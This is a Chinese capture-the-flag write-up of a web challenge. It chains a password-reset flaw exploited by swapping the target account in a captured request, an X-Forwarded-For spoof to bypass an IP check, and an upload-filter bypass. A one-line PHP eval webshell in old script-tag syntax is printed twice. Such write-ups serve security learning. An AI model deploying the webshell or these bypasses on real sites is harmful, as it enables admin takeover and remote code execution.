ailx10说：这篇是在2024年12月之前写的，后来又改过。bug 这题先让我盯上了密码重置。给自己注册账号、抓一次重置请求，再换掉其中的目标账号，结果竟然能影响管理员；进后台后又碰到来源限制和上传检查，我接着试 XFF 和不同文件内容。这篇把几个小判断串在一起，记录从身份到管理功能的推进。后半段用了旧 PHP 接受的 script 写法，不能看成今天通用的上传方案。真正值得反复看的，是每个步骤把谁当成了可信输入，以及一次通过后，下一道权限和内容检查是不是还在。

---

编辑核查提示：密码重置缺少目标对象授权检查是主要逻辑问题；XFF 和旧式 PHP script 标签均依赖特定服务端环境。 本稿保留历史题目截图及代码，未在原题环境重新运行；截图内容和水印、引用链接仍需发布前复核。

本文记录密码重置缺少目标对象授权检查的逻辑问题，并观察后续管理入口与文件上传。原示例使用特定环境下的旧 PHP 写法；不同版本与配置不一定支持。

```
<script language='php'>@eval($_POST['x']);</script>
```

难度系数：5（官方难度：5）

注册一下

![](/notes-assets/e7c530634b6635f84dce.webp)

登录一下，发现无法进入 Manage 模块，必须要 admin 用户登录才能看见

![](/notes-assets/f754c42718fa4ae93bb0.webp)

首页有一个重置密码页面，我们尝试重置 admin 的密码，但是需要校验身份

![](/notes-assets/1e7968d35d7d1271c4c5.webp)

重置一下自己的普通账号，使用Burp Suite抓包

![](/notes-assets/c0c55772de411fd76352.webp)

修改成 admin 账号，密码是 ailx10，发现重置管理员的密码成功了

![](/notes-assets/e83a84e6e875950f86b1.webp)

使用 admin 账号登录成功

![](/notes-assets/b2606149631f1452f8f7.webp)

进管理页面，发现 IP 地址不允许，这个简单，设置 X-Forwarded-For 应该就可以了

![](/notes-assets/c2624576492f838107db.webp)

设置 `X-Forwarded-For: 127.0.0.1` ，得到 flag 的线索 `index.php?module=filemanage&do=???`

![](/notes-assets/0a23ff1fef2f282154d4.webp)

这里猜测 ??? 是 upload 也不简单啊，要求上传图片

```
GET /index.php?module=filemanage&do=upload HTTP/1.1
```

![](/notes-assets/3c421557551aaafcaabb.webp)

上传图片马，发现被检测出来PHP代码了

![](/notes-assets/1541da6dafbd40ba1c36.webp)

把PHP删掉，又说 “你知道我想要的”

![](/notes-assets/2cb9ec4289e9fe8f694a.webp)

继续改 filename ，发现又说不像 PHP 文件

![](/notes-assets/da814db8bda4ade5711b.webp)

继续改内容，最终使用某些老旧的PHP配置支持`<script language='php'>`标签，顺利拿到 flag

```
<script language='php'>@eval($_POST['x']);</script>
```

![](/notes-assets/11eef942d1e08ab5c59c.webp)

逻辑问题和文件处理问题在这题里接到了一起。把身份、请求头和文件解析分别留下证据，比只给一个最终上传结果更能解释整条路线。
